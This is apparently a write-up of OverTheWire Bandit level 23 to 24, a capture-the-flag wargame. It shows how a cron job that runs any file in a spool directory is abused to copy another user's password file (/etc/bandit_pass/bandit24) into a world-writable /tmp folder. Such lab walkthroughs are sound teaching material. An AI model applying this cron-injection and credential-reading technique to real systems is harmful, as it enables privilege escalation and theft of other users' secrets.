# Bandit Level 23 → Level 24

## Level Goal

A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…


**Thought Process**:
After reading the bash file, you will notice that the code loops through all the shown as well as hidden files from /var/spool/bandit24/foo and excludes the files with '.' and '..' which are essentially system config files. But rest it executes a file and then deletes it. All this happens in 60 seconds i.e. a minute.

So, I need to write a file that essentially when gets executed will do something in our favour. Since the shell that runs, runs for bandit24 it should also have permissions to read the password. This is what we take advantage of.

In our .txt file we will cat the contents of /etc/bandit_pass/bandit24 which password for bandit24 which bandit24 has access to, into a file in a temp directory I create which my current level that bandit23 can access.
In this way I get the password.



**Steps**:

1. Firstly as it says there are `CRON` configuration files at `/etc/cron.d` we `cd` to there:
```
bandit23@bandit:~$ cd /etc/cron.d/
```

2. Execute cronjob_bandit24 using the cat command:
```
bandit23@bandit:/etc/cron.d$ ls -lsh
total 24K
4.0K -rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit22
4.0K -rw-r--r-- 1 root root 122 Sep 19 07:08 cronjob_bandit23
4.0K -rw-r--r-- 1 root root 120 Sep 19 07:08 cronjob_bandit24
4.0K -rw-r--r-- 1 root root 201 Apr  8  2024 e2scrub_all
4.0K -rwx------ 1 root root  52 Sep 19 07:10 otw-tmp-dir
4.0K -rw-r--r-- 1 root root 396 Jan  9  2024 sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
```

3. Read cronjob_bandit24.sh using the cat command:
```
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

```

4. Let's move to /var/spool/bandit24/foo since bandit24 would be the value of myname:
```
bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
```

5. Now create a temporary directory using mkdir command:
```
bandit23@bandit:/var/spool/bandit24/foo$ mkdir /tmp/ji
```

6. Give all permissions to this temp directory:
```
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 /tmp/ji
```

7. Now keep checking time, you have 60 seconds in a minute, so within 60 seconds create a .txt file using vim and write the command you wish to execute and give it all permissions:
```
bandit23@bandit:/var/spool/bandit24/foo$ vim passHere.txt
bandit23@bandit:/var/spool/bandit24/foo$ chmod 777 passHere.txt
```

In the .txt write:
```
cat /etc/bandit_pass/bandit24 > /tmp/ji/passHere.txt
```

8. Wait until the minute changes, then check your /tmp/ji folder , wherein if you were able to do all the above within 60 seconds then you would get your file. When you read it using cat then you should ahve your password:
```
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/ji/passHere.txt
